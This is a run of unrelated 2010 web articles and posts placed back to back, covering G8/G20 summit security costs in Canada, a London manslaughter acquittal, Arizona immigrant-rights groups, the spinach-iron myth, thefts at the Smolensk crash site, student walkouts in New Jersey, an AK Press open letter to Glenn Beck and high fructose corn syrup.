G8 summit Gleneagles , Scotland , July 2005 : $ 110 million
G20 summit London , April 2009 : $ 30 million
G20 summit Pittsburgh , September 2009 : $ 18 million US
" These numbers are off the scale with other G8s and G20s , " Ignatieff told reporters outside his party 's weekly caucus meeting in Ottawa .
" We 're three weeks away from the event where Canada will be on the world stage , and I want to be proud of Canada .
For now , I 'm embarrassed . "
Not a cost overrun : Toews
In an interview with CBC News earlier in the day , Toews defended the security estimate as the " most efficient and effective " use of public money for Canada 's " unprecedented " hosting of back - to - back international summits .
He also insisted the estimate was not a cost overrun .
" This has been budgeted for , and the money is released as it is required , " Toews said .
The estimated cost for security over the course of seven days in June dwarfs the amount spent at previous international summits and is expected to surpass the $ 898 million spent during the Vancouver Olympics — which spanned 14 days .
The official price tag for security at last year 's G20 summit in Pittsburgh was listed at $ 18 million US , according to municipal and U.S. federal officials .
But Toews said comparing the costs for security at this year 's summits with the amount spent at the Olympics is like comparing " apples and oranges " because the G8 and G20 meetings , with so many heads of countries visiting at once , require a very " different type " of security .
" Granted there were some heads of nations at the Olympics , but nowhere in the configuration or the numbers that are going to be here , " Toews said .
" I do n't think you can say , ' Well , because it 's seven days instead of 14 days , it should be half the price . '
It simply does n't work that way . "
The face - to - face meetings , Toews said , allow leaders to deal with issues that simply can't be handled over the phone or by video - conference .
When asked by the Liberals during Wednesday 's question period to explain the costs , Toews said the government believes the experts when they say such a level of security is necessary .
" I understand that the Liberals do n't believe in securing Canadians or the visitors here , " Toews told the House .
" We 're different . "
NDP Leader Jack Layton said the Conservatives have " quadrupled " funding for security , and some of that money could have gone to the government 's G8 maternal health initiative .
Layton then chastised the Conservatives for refusing to include abortion in its maternal health plan .
" You can do a lot of things with a billion dollars , " Layton told the House .
In response , Prime Minister Stephen Harper repeated the government 's position that Canadians do not want a debate on this matter .
Single venue would have saved money : Liberals
G8 leaders will gather in Huntsville , Ont. , late next month , then join other world leaders for the G20 summit in the heart of downtown Toronto .
The security money will be used for planning , accommodation , information technology and working with security partners to protect leaders and their delegations .
The additional $ 160 million in costs includes about $ 100 million for office and meeting spaces and pre-summit meetings .
Another $ 1.2 million is to ensure the food served to dignitaries is safe and healthy , while $ 10 million has been spent on infrastructure and about $ 50 million has been paid to spruce up the Huntsville area .
Ignatieff ridiculed the Conservatives for switching the G20 meeting venue from Huntsville to Toronto months into the planning stage .
" At first they said Huntsville , then they said , ' Oops , Huntsville is too small and too many flies .
Let 's high - tail it down to Toronto , ' " he said .
" This is the confusion we 're talking about . "
Holland said the government could have reduced security by hosting both summits at a single location , instead of the " logistical nightmare " of two separate venues hundreds of kilometres apart .
But Toews said the dates of the summits were actually moved closer together to save money .
Holland said security for the summits is critical , but the government should n't be handed a blank cheque .
" We 're not talking about cutting corners ; we 're talking about proper planning , " Holland told CBC News on Wednesday .
" They tried to force a round peg into a square hole . "
Security plans for the G20 meeting in Toronto feature two fenced areas — an outside fence that will close off a large section of the downtown and disrupt access to homes and workplaces , and an inner fence that will control access to hotels and the convention centre .
Later Wednesday , Chris McCluskey , a spokesman for Toews , accused Ignatieff of failing to understand the cost of the summits .
" His comments indicate he has no understanding of the parliamentary budget process , no understanding of the reality of providing security to world leaders , and no understanding of what it takes to have Canada take its rightful place on the world stage , " he said in an email .
" The only embarrassment here is Mr. Ignatieff ’s ill - informed commentary on an event he should be supporting . "

Remember that trader who got into a fight with an IT boss over a woman and killed him ?
With one punch ?
He 's been released from all charges of murder .
From the Telegraph : Jeremy Aylmer claimed he acted in self - defence and a jury took just 32 minutes to acquit him of manslaughter .
In the courtroom , he allegedly " smiled narrowly " at the jurors who just vindicated him .
Creepy !
Here 's the backstory :
It all started on London 's Wardour Street when Aylmer began chatting up Jemina Luizaga , who was hanging out with a group of people that included 56 - year old Charles Cox , formerly a VP of the IT firm EDS .
Aylmer " flirted with her on the dance floor , " but then she rejected him and went back to her table .
When Aylmer came over , Cox told him to leave Jemina alone .
Then as everyone was leaving the club , Aylmer came up to her again .
This time , Cox pushed him away .
Aylmer socked him in the face .
Cox fell to the ground and cracked his skull .
He went into a coma and eventually passed away .
On trial for murder , Aylmer apparently insisted Cox was the aggressor .
The court agreed and he was freed of charges yesterday .
Get to Arizona !
A number of people have asked me about how to support groups doing good work against the nasty immigration shit going on in Arizona .
Work that does n’t limit itself to “ mere ” reform .
I ’ve also been sad witness to several toothless Facebook groups that seem to limit “ support ” to pressing a few buttons on your computer keyboard to register your dissatisfaction …uh , and that ’s it .
So , below is a list of organizations I think you should consider supporting in concrete ways .
Each link I provide includes some way to donate funds … and some offer other ways to help out .
And remember the words of Public Enemy in “ By the Time I Get to Arizona ” : “ Neither party is mine , not the jackass or the elephant . ”
Yours ,

We demand that all human beings — with papers or without — be guaranteed access to work , housing , health care , education , legal protection , and other public benefits , as well as the right to organize .
Our strategy is to help build a grass roots social movement that can repeal these laws , change the terms of the national debate on immigration , and expand the freedom of all people — documented and undocumented .
“ We believe that all people have the right to live , love , and work wherever they please , and this is what we strive for . ”

Regarding more specific forms of assistance , Repeal Coalition member Taryn D. Jordan writes :
Money .
As I have stated before we are all broke here and living on the goodness of the center of new community .
So if comrades could start hosting house parties what ever you can send will be helpful .
We need money for copies of fliers , gas to get around town and t shirts , and money for mass texting services .
We need people .
I know in our last few communications with folks we have demanded for organizers but we are willing to take less experienced folks if they are the right person .
We will be conducting interviews via Skype .
We hope if you all know of folks who have skill sets in , activism , video editing ( and equipment ) , work shop building , theoretical background lending towards the importance of grassroots organizing etc .
We ’ll take them .
We will develop a work plan and a 3 – 4 hour work shop orientation along with plugging them in to other activities around town if needed .
The reason we are willing to take more folks then before is we are hedging on a two front war and between the three of us , the work will not sustain if we do n’t get help really soon .
For right now lodging can be free due to the love and kindness of the Center for a New Community .
But all other expenses will have to be paid by the person coming .
We still need you political support : I will continue to post reports and attempt to make them as nice as possible .
If folks will support me in turning this into some sort of blog entry or something and get the word out nationally on what we are doing that would be great .
We will also be emailing videos ( shot via cell phone ) or recorded mp3s of our thoughts on this growing movement .
If comrades with better tech skills then the three of us can help in getting this posted please do so , we will provide content in what ever way we can .
“ Bring the Ruckus is a national organization of revolutionaries dedicated to fighting white supremacy and building dual power . ”
For those of you unfamiliar with the term “ dual power , ” it refers to a political strategy that creates alternative institutions with the goal of ultimately creating an overall “ alternative social infrastructure that fulfills economic , political , social , and cultural needs . ”
You know , creating the new in the shell of the old .
On their “ About Us ” page BtR elaborates :
“ The focus of our work should be involving ourselves in movements and activism where there is the potential to work toward the building of a dual power .
Social reforms won by progressive movements may be important , but if they do not work toward a dual power they are not the concerns of a revolutionary organization .
For example , animal liberation is a worthy cause .
However , it is difficult to imagine how a campaign for animal liberation could threaten state power and foreshadow a new society .
Thus , while a revolutionary organization may applaud animal liberation activities , it would not devote energy toward animal rights .
On the other hand , a program to develop local Copwatch chapters could represent a dual power strategy , since monitoring the police undermines state power by disrupting the cops ’ ability to enforce class and color lines and also foreshadows a new society in which ordinary people take responsibility for ensuring the safety of their communities . ”
“ Phoenix Class War Struggle is a fanatical , revolutionary anarchist group pressing the attack against capitalism , the state and all systems of hierarchy and oppression .
We fight for a self - determined , projectual life for ourselves and all humanity .
We oppose those who hinder working class self - organization .
We are libertarian and libertine .
We support movements but we do n’t wait for them .
We are in the thick of it . ”
“ Phoenix Copwatch is a citizen ’s group formed in 1998 to combat abuse by the police in our community .
We use a variety of means to fight police abuse , including community patrols , videotaping of police activity , and education .
Copwatch is completely independent from the police , all other law enforcement agencies , the government , and all political parties .
Although Copwatch groups exist in many other cities around the world , they all operate independently , and there is no national or international body that oversees our organization .
All of our members are unpaid volunteers who freely dedicate their time to ending police abuse . ”
“ O’odham Solidarity Across Borders Collective is made up Akimel O’odham and Tohono O’odham youth who are pressing the attack against the ongoing colonization of our traditional lands ( i.e. U.S. / Mexico Border policies ) , environmental racism from transnational corporations and the state , and all colonial polices aimed at destroying our O’odham Him’dag ( Traditional Way of Life ) .
We fight for self - determination , and true sovereignty of our lands .
We advocate for the traditional elders in Mexico and the United States .
We provide an autonomous space for O’odham to educate themselves on the issues that affect our land and people ( our future ) .
We encourage and support all O’odham , especially the youth , in carrying on our traditional practices , just as our ancestors did before us .

7 The Source of Spinach's Power

Popeye the Sailor Man : you gotta love him .
He talks like he 's been using his head to hammer nails for the past eight decades , likes his girls anorexic , starts more fights than Joe Biden on a month - long speech bender and sports enormous forearms that Mark McGwire can only whack off to .
The source of his powers : spinach .
Back when steroids came in a can .

The Typo :
Unfortunately , it turns out that spinach 's claim to fame can be attributed to a typo from the 19th century , followed by one of the greatest conspiracies in the history of agriculture .
A 1870 German study that served as the basis for Popeye 's spinach - fueled ' roid rage accidentally printed the decimal place for spinach 's iron content one spot too far to the right .
For our non-mathematically inclined readers , that means the report claimed the vegetable had 10 times its actual amount of iron , which ended up equaling out to almost as much as red meat .
" No thanks , I 'll have the compost . "

As a result , entire generations of children , adults and doctors grew up thinking that eating spinach would turn you into freaking Wolverine .
The Result :
Unfortunately , it appears that all the E. Coli scares on the planet wo n't erase one 140 - year - old typo .
You thought we were kidding about the spinach industry having a propaganda wing ?
To this day , the Kids edition of the Encyclopedia Britannica informs children that spinach is " loaded " with iron in the first sentence of its spinach entry , and the abridged version of the Encyclopedia uses three of its 79 word definition to tell us that " spinach is rich in iron . "
Oddly , Britanica 's watermelon entry says nothing about its iron content , even though the fruit has just as much iron as spinach while managing to taste far less like shit .
Four soldiers have been charged with stealing credit cards from the wreckage of the plane crash that killed Kaczynski and 95 others ( AP )
Emergency ministry workers search through the wreckage of the Polish presidential plane in Smolensk , Russia ( AP )
Four Russian soldiers have been charged with stealing bank cards from the wreckage of the plane crash that killed Polish President Lech Kaczynski and 95 others .
They used at least one of the cards to withdraw 60,345 roubles ( about £ 1,500 ) .
" The four suspects have admitted their guilt and are actively co-operating with investigators , " an investigative committee said .
Poles have reacted with shock and outrage that people would try to profit from a crash that has deeply shaken the nation , and is widely considered the country 's worst tragedy since the Second World War .
The Super Express tabloid condemned the thieves as " hyenas . "
The theft also raises doubts in Poland about whether all procedures were followed in securing the crash site - and it risks straining the good working relationship formed between Russians and Poles in the aftermath of the crash .
The soldiers were attached to the airport in the western Russian city of Smolensk , where the plane carrying Mr Kaczynski crashed on April 10 .
The president was leading a high - ranking delegation to a memorial ceremony for Polish prisoners of war massacred by Soviet secret police at the start of the Second World War .
Polish officials said that the money was withdrawn using a card that belonged to Andrzej Przewoznik , a prominent official who oversaw Poland 's wartime memorials .
They said the thieves failed to obtain cash from another card that belonged Mr Przewoznik .

" I 've been struggling with what I saw and whether or not to share it .
Part of me wants to know if I 'm not alone in my experience and the other part wants to believe it was just in my imagination and I should n't attempt to learn more .
On the grand scale of experiences this probably wo n't be that interesting to some people , but I 'm afraid because of it and that is what has led me to share .
Two nights ago I was in my apartment with my 1 - year - old son .
His dad was working the night shift at 1 am so I do n't know the exact time this happened but I 'd say between 2 - 4 in the morning .
We have a king - sized bed and our son fell asleep with me so I let him stay there .
At some point I woke up to the baby rolling around the bed and kicking me .
At the time I did n't know what his problem was but he was keeping me awake .
This lasted for a while because usually when my son sleeps next to me he does n't move so much and I figured he 'd eventually be still .
He did n't though .
He kept moving around half asleep and I was worried that he'd roll off the bed .
It felt like this went on for at least 30 minutes if not longer and I got frustrated that I was awake so I decided to move him to his playpen in the living room .
I laid him down and then went to the bathroom .
From the bathroom I could see the living room ( I left the door open ) .
I should also mention that even at night it 's not completely dark in our apartment so you can still see fairly well .
As I was on the toilet I looked over to where the playpen is just for a few seconds and I saw some kind of creature .
It was all black and hunched over like it was hiding behind the playpen but not very well .
The playpen is made with see - through netting anyway so you can see right through it .
This thing had long arms and my memory says it was slightly muscular on its upper body .
What struck me as " off " about the whole thing was that it had long pointy ears like an elf but bigger .
WTF ?
I finished and rushed to the living room and nothing is out there , so I walk into the the bedroom with the image of this thing lingering in the front of my head .
I tried to discount it or come up with an explanation , but I do n't have one .
I know it 's natural for people to see faces or human shapes but this thing was not human looking , and I 've never seen anything like it .
There 's no reason my brain would of just made this thing up while I 'm trying to go to the bathroom and I 'm worried about my son .
I ended up grabbing the baby and he slept with me anyway , I was n't going to take any chances .
The next morning he was sick with a cold so I 'm guessing that 's why he was so uncomfortable , but it 's been a couple days now and I can't shake off what happened .
If I had to give this thing a name Id say it resembled a large goblin .
It also had a larger than human - sized head .
I guess I 'm looking for input or some kind of advice .
Do I pretend nothing happened ?
How do I protect my family if this was something paranormal and it comes back ?
I 've had a few unexplained experiences in my life time but never anything like this in my own home .
This whole thing has me very worried . "

Support for Stephen Harper 's Conservatives has increased to give the party a lead of almost 10 percentage points over their Liberal rivals , a new EKOS poll suggests .
Asked how they would vote if an election were held " tomorrow , " 34.4 per cent of those surveyed said they would vote for the Conservatives , compared with 25.1 per cent for the Liberals and 15.3 per cent for the NDP , according to the poll released exclusively to CBC News on Thursday .
Twelve per cent of respondents said they would vote for the Greens , while 10.6 per cent favoured the Bloc Québécois .
A week earlier , support for the Tories stood at 33.6 per cent , the Liberals at 27.1 per cent , and the NDP at 16.9 per cent .
That means the spread between the Tories and Liberals has widened to 9.3 percentage points from 6.5 points , mostly because of the Liberal decline .
The survey results marked the first time in months that support for a political party has surpassed the 34 per cent level .
The gap between the Conservatives and Michael Ignatieff 's Liberals has been slowly widening through the spring .
Men continue to be stronger supporters of the Conservative party than women — 38.0 per cent compared to 30.7 per cent .
As in recent weeks , there was no notable gender gap among Liberal supporters .
Support for the Liberals among men surveyed was at 27.4 per cent and support among women at 25.5 per cent .
Consistent with EKOS poll results in recent weeks , 51.1 per cent of those surveyed said the country is moving in the right direction , while 38.2 per cent said it 's moving in the wrong direction .
Conservative supporters , respondents in Alberta and in the Atlantic region are most likely to agree that the country is moving in the right direction , the survey suggests .
This week 's poll suggests Liberal supporters surveyed were more likely to report that the country is moving in the right direction ( 50.8 per cent ) than the wrong direction ( 37.1 per cent ) .
But they continue to be critical of the direction of the government , with 32.9 per cent saying the government is moving in the right direction and 52.2 per cent saying it 's moving in the wrong direction .
For the poll , EKOS queried 2,794 people by phone between May 12 and May 18 .
The main voter - intention results are considered accurate to within 1.9 percentage points , 19 times out of 20 .

Jersey City high - school students defend April 27 walkout
By a reporting team
3 May 2010
On Tuesday , April 27 , tens of thousands of students in New Jersey walked out of their classes to protest $ 820 million in education budget cuts being implemented by Governor Chris Christie .
The protests were spontaneously organized on a Facebook group , and spread by text - message and word of mouth .
The cuts will average 11 percent statewide , with mass teacher layoffs and severe cuts to athletic and arts programs .
Other walkouts across the state occurred on Wednesday and Thursday .
Another Facebook group announced plans for a statewide school walkout on May 12 .
The largest protests took place in the some of the poorest schools districts , notably in Newark .
About 5,000 students rallied at City Hall , demanding to see Mayor Cory Booker , where “ virtually every uniformed cop in the city was being called to control the crowd ” , as nj.com noted .
Many students who participated in the walkout were threatened with loss of privileges , detention , and , in some cases , suspension .
At Cresskill High in Bergen County , 45 students were suspended , but later had the punishment revoked after meeting with administrators .
According to the Wall Street Journal , police stopped 500 students who walked out from East Side High in Paterson .
Seventeen students were arrested .
Donnie Evans , the Paterson Schools Superintendent said that he “ will be handling disciplinary action ” .
In Parsippany - Troy Hills Township in Morris County , approximately 100 students from Parsippany High School who walked out and were marching to the town ’s municipal building , were stopped by police , loaded on to a school bus and driven back to school .
They are being given Saturday detention as punishment .
On Wednesday police were called into Parsippany High because of alleged disruptive behavior by students in the cafeteria and the pulling of fire alarms .
According to nj.com , “ Some school board members expressed concerns about a lockdown - style academic environment and reports of a disorderly high school ” .
Governor Christie on Wednesday blamed “ some administrators and teachers , if not organizing , encouraging students to protest , looking the other way as they headed for the exits or later lauding their actions . ”
A spokesman for the teachers union , the New Jersey Teacher ’s Association , which has worked to impose the budget cuts on its membership , said that students “ should pay the piper . ”
A World Socialist Web Site reporting team spoke to students at William L. Dickinson High School in Jersey City , asking them about the impact of the budget cuts as well as their views on the walkouts .
Jersey City is a city of about 250,000 located just across the Hudson River from New York .
Students at Dickinson , County Prep High School , James J. Ferris High School and Lincoln High School all walked out on Tuesday .
There were reports of more walkouts at Lincoln on Wednesday .
Yalitsa
Yalitsa , a senior at Dickinson , told the WSWS : “ On Tuesday at 1:15 , I saw about 30 or so [ students ] at my side of the school and I heard there were more out front .
I think things started at Country Prep. Ferris High School walked out on Tuesday the same day we did .
Lincoln walked out on Tuesday , and they walked out again on Wednesday .
“ The principal said if anyone walks out they would be punished .
I would say 100 people walked out , including some of my friends .
There are probably 3,000 students at the school .
“ One reason we walked out was for our education , another was for the teachers .
They are cutting money from their pay .
If that happens , teachers will leave and the classrooms will get more crowded .
We will lose all of the individual attention that we need from our teachers .
Now there are about 20 to 30 in a classroom , but some classes have more than that .
The after - school programs are being cut .
I ca n’t be active in sports because I have to work , but I have a lot of friends who play sports .
Some get scholarships for it to go to college . ”
Amish , a sophomore , said , “ Many people were ready to walk out , but they stopped after they were threatened by the principal and the police outside . ”
His friend Mohammad , also a sophomore , said , “ They are cutting down on educational materials like paper .
So next year we will have to bring our own paper to school , or we will be without it .
They said they were either going to cut paper or textbooks .
We do n’t know what is going to happen next , but we think there should be more demonstrations and walkouts . ”
Momo said , “ I forwarded a text message I received from a friend for the walkout .
I forwarded it to my phone book with about 35 people at Dickinson .
The budget cuts will take away sports from us .
They want to cut the teachers ’ pay by 12 percent .
I ’ve heard ten teachers , the newest teachers , are going to be cut .
This was n’t on the text message I forwarded ; I ’ve heard this from other sources .
At the walkout I saw a lot of students from Lincoln walking around trying to advertise it . ”
Jason , a freshman , said : “ We had planned that 5,000 students would go to Trenton on Tuesday , but the principal stopped us , and there were a lot of cops outside to keep us from walking out .
There were Jersey City cops .
We saw at least three cop cars .
They are cutting out every sport from football to soccer .
They are cutting the marching band , and they are cutting other arts .
They are also cutting the Educational Opportunity Funds ( EOF ) for students who want to go on to college .
They will reduce the EOF this year and eliminate it next year . ”
Another freshman , John , told the WSWS : “ I was one of the students that walked out of this school at 1:15 PM .
The time was proposed on Facebook .
A friend told me about it .
“ I would say that about 100 students walked out .
The principal kept saying on the loudspeaker not to walk out .
If we walked out , there would be serious consequences .
“ I disagree with their cutting school budgets .
There are a lot of cuts in sports .
Now there are no freshman and junior varsity teams .
There is no more money for coaches .
They are taking away buses to go to the games .
They are eliminating field trips .
There used to be field trips for all the clubs . ”
Rouel , a junior , added : “ Although I did not walk out , I did support and agree with it .
If the principal did not speak out on the public address system , I , as well as almost everyone in the school would have walked out .
The school security guards were at every door to prevent people from leaving . ”
Mary Martinez , a junior : “ I did walk out .
I do n’t agree with the budget cuts .
We said , ‘ No budget cuts .
Save our schools . ’
They cut the football team — I do n’t agree with that , and I support the teachers .
“ They say that there is no money .
But why are the banks getting bailout money ?
The cuts in education are not right .
It is not fair that they give to the rich and take from low - income families .
“ The principal kept getting on the loud speaker and making announcements that we had better not walk out or there will be consequences .
The only consequences that I have heard about is that all the students who walked out will not be allowed to attend the once - a - year multi-cultural event , where all the clubs like the Spanish club , the Afro - American club , West Indian club get together .
Everyone in the school goes .
There is a lot of music and dancing .
“ If the principal did n’t make the announcements , more students would have walked out .
Most likely the whole school would have joined in protest . ”
Kimberly
Kimberly , a senior said : “ I believe in the cause .
I am against the budget cuts in the sports program , and other after school programs .
The football team is gone .
The arts and music programs will supposedly be cut .
It ’s ridiculous .
Why should we suffer like this ?
We need after - school activities so we can have something creative and positive to do .
“ Sports are part of our educational opportunities .
One of my friends got a scholarship to go to play college football .
These scholarships will be eliminated .
“ They bail out the banks and other financial companies like Goldman Sachs , and they are cutting our programs which helps us develop our creativity .
If they cut these out , there is nothing left .
“ We support our teachers .
I love all my teachers .
They are all amazing .
There are a lot of new ones in the school .
Their jobs are being threatened .
I hate to see them go .
I like school .
We have teachers that are creative and cool .
“ I have already been accepted to go to New Jersey City University .
The state is cutting the EOF [ Education Opportunity Fund ] summer programs .
This is a program where for six weeks during the summer , the high school student takes college course .
The program helps you go to college in part by giving the student credit and thereby helping pay for tuition .
They are cutting the program from six to three weeks , and then cutting it completely .
“ Governor Chris Christie says that we should have stayed in school .
But what he says makes no sense — the purpose of the walkout is to fight these cuts so that we can stay in school .
These cuts are threatening teachers , students , and parents .
Our parents work hard to send their kids to college .
But if they cut financial aid , we ca n’t afford to go to college .
“ They say we are the future , and that ’s true .
But if they take away our education then what kind of future will there be ? ”
A controversial Calgary preacher says the Stampede is refusing to allow his church to join the Stampede Parade .
Arthur Pawloski runs Street Church Ministries and says his right to free speech is being violated .
" Christian community is part of what Calgary is .
It 's part of the heritage of this country and it's very important for the Christian community to be represented in that parade and also we represent the poor , " says Pawloski .
Members of the church say they 've already spent $ 20,000 on props , costumes , and horse - drawn carriages for this year 's parade entry .
The Stampede Committee says it wo n't allow Street Church to participate in this year 's parade because of rule violations from last year .
The committee says members of the ministry broke the rules when they passed out pamphlets to parade spectators .
They did n't play by the rules and regulations that we set out for all entries , " says David Swanson , a spokesperson for the Stampede Committee .
" And I 'd like to point out that simply making an application to be in our parade does n't guarantee anybody 's acceptance into our parade . "
Pawlowski argues his ministry was told they could distribute pamphlets , by on - site parade officials , and says he 's being targeted because of his outspoken religious beliefs .
The Calgary Stampede says the decision has nothing to do with religion and is about respect for the rules .

" It will be unparalleled in the history of literature , " predicted the Times in 1899 of Mark Twain 's autobiography .
" A bequest to posterity . "
Now , 100 years after the author died , his complete memoirs will be made public for the first time .
Twain had specified that his autobiography remain unpublished for a century after his death , to ensure that he felt free to speak his " whole frank mind " , knowing that when his " Final ( and Right ) Plan " for relating the story of his life was eventually published , he would be " dead , and unaware , and indifferent " .
The author passed away on 21 April 1910 , and this November , the University of California Press will publish the first volume in the " complete and authoritative edition " of his autobiography , promising that the book would present Twain 's " authentic and unsuppressed voice , brimming with humour , ideas , and opinions , and speaking clearly from the grave as he intended " .
" When people ask me , ' Did Mark Twain really mean it to take 100 years for this to come out ? ' , I say , ' He was certainly a man who knew how to make people want to buy a book ' , " editor Dr Robert Hirst told the Independent yesterday .
" There are so many biographies of Twain , and many of them have used bits and pieces of the autobiography .
But biographers pick and choose what bits to quote .
By publishing Twain 's book in full , we hope that people will be able to come to their own complete conclusions about what sort of a man he was . "
Although parts of the autobiography have appeared in previous biographies of the author , Hirst said that over half of it had never been published before .
Running to half a million words , the trilogy of books will cover Twain 's relationship with his secretary Isabel van Kleek Lyon , his religious doubts and his criticisms of Theodore Roosevelt , according to the Independent .
An Open Letter to Glenn Beck
Dear readers :
We here at AK Press were both shocked and ( we ’ll admit it ) thrilled when right - wing media mogul Glenn Beck held up our new book on the Greek Insurrection of December 2008 on his FOX News program a couple of weeks ago , and compared it to The Coming Insurrection , saying that this book was the next “ playbook ” that radicals in this country would be taking a page from .
( We wish . )
But we were also kind of confused , because Beck seemed eager to interpret the book as a yet another installment in the “ communist ” conspiracy … only , well , we ’re anarchists , we ’re damn proud of that fact , and we ’re frankly a little hard pressed to understand why Beck went out of his way to say explicitly that this was n’t an anarchist book .
And then we watched hours and hours of Beck blabbing on YouTube , and we started to notice a more general pattern :
Beck tends to avoid directly confronting “ anarchism ” as a system of political actions and ideals .
So we started thinking about why that might be , and the result of our deep deliberations follows in an open letter to Mr. Beck .
We encourage you to post this far & wide ; let ’s take advantage of this unexpected moment and try and push for some real public discourse around anarchism , about what it means , and about why it works .
An Open Letter to Glenn Beck from the AK Press Collective
Hi Glenn .
How ’s it going ?
Since Forbes magazine says your annual earnings are in the ballpark of $ 32 million , we ’re guessing that it ’s going pretty well .
You ca n’t put a price on defending the little guy , right ?
We are the AK Press collective .
In case the word “ collective ” throws you , it means people who work together toward a shared goal in a democratic manner , without bosses or leaders , and with everyone having an equal say in each decision .
For us , that shared goal is publishing and distributing books .
If you want , you can learn more about us here : http://www.akpress.org/about/aboutakenglish.
We ’re thrilled that you featured our book We Are an Image of the Future : The Greek Revolts of 2008 on your May 3rd show .
We were , however , a little confused by your description of the book , and the way that it fit into the overall argument you made .
Okay , to be honest , we were n’t sure what your argument was .
We watched the clip on YouTube a dozen times , but it was beyond us .
Of course , you ’re the guy with television , radio , publishing , and Internet empires .
We probably spend too much time thinking about rent , food , and health insurance to fully understand the big picture you ’re painting .
We do , however , know a few things .
We ’re anarchists and we publish books about anarchism .
We Are an Image from the Future is one of them .
Now , we assume that you actually read the books you talk about on your show .
Yet you somehow managed to claim that a book written by and about anarchists was “ written by communist revolutionaries . ”
“ They are not anarchists , ” you claimed , “ but they will use anarchy to their favor . ”
As you made clear earlier in your show , you know the difference between Communism and Anarchism .
We do n’t want to split hairs by bringing up the complex history of communism ( with a small “ c ” ) , which includes both democratic and nasty authoritarian versions .
So we ’ll stay on your page here and say , yes , when Communists take state power it ’s always ugly .
But , as you must know , anarchism has always opposed state Communism .
State Communism is the ultimate “ big government . ”
You wo n’t find an anarchist on this planet in favor of that .
Not to mention that , historically , when Communists get in the driver ’s seat , anarchists are usually the first to face the firing squad .
The capitalists usually get cushy managerial positions .
So we asked ourselves :
What could account for this guy waving around a book written and published by anarchists , while never quoting a single word from it , and then going on to associate the book with political groups — like the Revolutionary Communist Party and the Workers World Party — that no one in the book , or associated with the book , would endorse ?
How could he miss something so obvious ?
Then it dawned on us : you ’re afraid of anarchists .
You ’re not afraid of the fake media portrayal of anarchists as bomb - throwing maniacs : that ’s your bread and butter .
You ’re afraid of real anarchists , the actual ideas they espouse , the real work they do .
We do n’t blame you , Glenn .
When we sift through your rants , we realize that there ’s a lot of overlap between you and anarchists .
The difference is that anarchists are more honest , are n’t part of the same elites they criticize , and they make a lot more sense .
They see you , and raise you one .
Like you , we believe that people ’s lives would be much better off without government intervention .
Centralized power suppresses individual and community initiative and keeps people from achieving their full potential .
Like you , we do n’t think the solution to our current economic crisis lies in socialized industry or new layers of well - paid government bureaucrats .
And , like you and many of your tea party pals , we agree that bankers and fat - cat corporate elites are n’t exactly concerned with our best interests .
As you put it , it ’s time to take down the folks who “ line their pockets with wealth gained from enslaving a whole group of people . ”
And , although you seemed a bit confused on this point , that means putting “ people before profits , ” which is pretty much the central concern of the protesters in Greece right now .
And we mean all people , regardless of income , race , gender , sexuality , or immigration status .
You ’re right : we ’re revolutionaries .
But are n’t you ?
Remember the part of the Declaration of Independence that says that when a government starts screwing with life , liberty , and the pursuit of happiness , “ it is the Right of the People to alter or to abolish it ” ?
As anarchists , we ’re dedicated to the idea of abolishing the state and capitalism altogether .
We believe that without the coercive relations and competition imposed by governments and markets , people would be free to create a more just society in which resources are controlled collectively and decisions are made by the people who are affected by them .
We do n’t want a government ( revolutionary or otherwise ) ; we want a society based on cooperation and common sense instead of arbitrary power and exploitation .
From what sense we can make of your show , you seem happy with “ altering ” rather than “ abolishing ” a screwed - up system .
For you , replacing the old boss with a new one ( Sarah Palin ? ) is good enough .
We understand that you ’re confused — these are confusing times .
But , deep down , you and the tea partiers know that you ca n’t trust any politician , or banker , or corporate hack , or union bureaucrat…or anyone who makes their living sucking power and profit from ordinary people .
Which , unfortunately , probably includes multi-millionaires like you .
So , Glenn , we ’re guessing that ’s why you ’re so afraid of us .
We do n’t fit neatly into your black - and - white formula .
You simply borrow some of the best ideas from our 150 - year - old anti-authoritarian tradition .
We take those same ideas and not only run with them , but improve on them .
We follow the logic to its ethical conclusion .
And we include corporate media moguls like you in our Hall of Infamy .
But we ’re reasonable folk .
We understand that you find it scary to think about what will happen when ordinary people realize that they actually have the power to make their own decisions and take control of their own lives .
So , here ’s what we suggest :
Just admit you ’re afraid of us .
Admit that your passionate and convoluted rants are a nervous dance around your inability to support real freedom ( anarchism ) over unbridled power ( Communism and capitalism ) .
And then use your massive wealth and power for the forces of good .
Yours ,

Where are you located ?
Were doing a may 4th club event in South Florida if you 're anywhere near .
It seems to be human nature to want to find ONE SOLUTION to complex problems .
Obesity is no different .
Every few years something new is blamed as THE CAUSE OF OBESITY .
At least one of those is high fructose corn syrup ( HFCS ) .
Like others before , it has been blamed as the cause of obesity , diabetes / The Metabolic Syndrome , health problems and the breakdown of the nuclear family .
A lot of this idea started with research by Bray who CORRELATED an increase in the intake of high fructose corn syrup with increasing rates of obesity .
Much of this started with a 2004 paper by Bray where he correlated changes in HFCS intake with changes in obesity , suggesting that it was the increase in HFCS intake that was driving obesity .
This was taken , as usual , far out of context into the popular realm of magazines , newspapers and tv soundbites .
Suddenly high fructose corn syrup was THE enemy .
Nowhere is this more prevalent than in the athletic / bodybuilding and fat loss arena where people are simply losing their ever - loving minds over anything with HFCS .
Any food that dare list high fructose corn syrup on its label ( even if the total quantity is obviously miniscule ) is immediately deemed to be evil , a destroyer of not only one ’s physique but a corrupter of children , a direct line to Satan himself .
Ok , maybe I ’m exaggerating but not by much .
But is this actually the case ?
Is HFCS in and of itself the problem here ?
To examine the issue , I want to look at the paper
White JS .
Straight talk about high fructose corn syrup : what it is and what it ai n’t .
Am J Clin Nutr . 2008 Dec;88(6) :1716S-1721S .
High Fructose Corn Syrup : What It is and What it Ain’t
This paper , in the aggregate , addresses this idea , by looking at the hypothesis that somehow HFCS is uniquely obesity or health - problem causing beyond simply being a source of calories .
The author states that several assumptions must be found to be true to accept this idea as fact .
They are :
HFCS and sucrose are significantly different
HFCS must be uniquely obesity - promoting
HFCS must be predictive of US obesity
HFCS must be predictive of global obesity
Eliminating HFCS from the food supply must significantly reduce obesity
I wo n’t detail in full every one of his arguments .
But the punch line of course is that none of these actually turn out to be true .
Yes , HFCS and foods containing them often contribute a large number of calories to the diet and clearly that alone causes problems .
But there is nothing special about HFCS to warrant the fear about it that many seem to have developed .
By the way , this is the chemical structure of high - fructose corn syrup .
What is HFCS and is it Really Different than Sucrose ?
Historically , HFCS was developed back in the 50’s as an alternative to cane sugar for food preparations .
The reasons why HFCS is superior for foods than cane sugar is n’t really that relevant .
Sufficed to say that HFCS is more stable and has replaced your basic cane sugar / sucrose in a lot of foods .
